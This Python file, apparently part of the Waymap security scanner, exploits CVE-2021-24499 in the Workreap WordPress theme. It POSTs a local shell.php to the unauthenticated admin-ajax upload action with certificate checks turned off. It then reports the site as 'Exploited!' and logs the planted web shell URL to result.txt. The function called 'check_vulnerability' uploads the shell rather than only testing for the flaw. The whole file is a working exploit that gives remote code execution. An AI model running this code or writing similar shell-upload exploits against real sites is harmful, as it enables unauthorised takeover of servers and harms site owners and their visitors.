# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2021-24499

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    BOLD = '\033[1m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    RESET = '\033[0m'

def check_vulnerability(profile_url):
    shell_path = 'shell.php'
    
    try:
        with open(shell_path, 'rb') as shell_file:
            files = {
                'action': 'workreap_award_temp_file_uploader',
                'award_img': shell_file
            }
            response = requests.post(f"{profile_url}/wp-admin/admin-ajax.php", files=files, verify=False)
            if "File uploaded!" in response.text:
                return True  
            else:
                return False  
    except requests.RequestException as e:
        print(f"{Colors.RED}Error connecting to {profile_url}: {e}{Colors.RESET}")
        return False  
    except IOError as e:
        print(f"{Colors.RED}Error reading file: {e}{Colors.RESET}")
        return False 
    
def scan_cve_2021_24499(profile_url):
    print(f"{Colors.BOLD}Checking {profile_url}...{Colors.RESET}")
    if check_vulnerability(profile_url):
        shell_url = f"{profile_url}/wp-content/uploads/workreap-temp/shell.php"
        print(f"{Colors.GREEN}[*] {Colors.BOLD}{profile_url} Exploited!{Colors.RESET} \n --> SHELL: {Colors.BOLD}{shell_url}{Colors.RESET}")
        with open('result.txt', 'a') as result_file:
            result_file.write(f"{shell_url}\n")
        return True 
    else:
        print(f"{Colors.RED}[-] {Colors.BOLD}{profile_url} Not Vulnerable!{Colors.RESET}")
        return False 




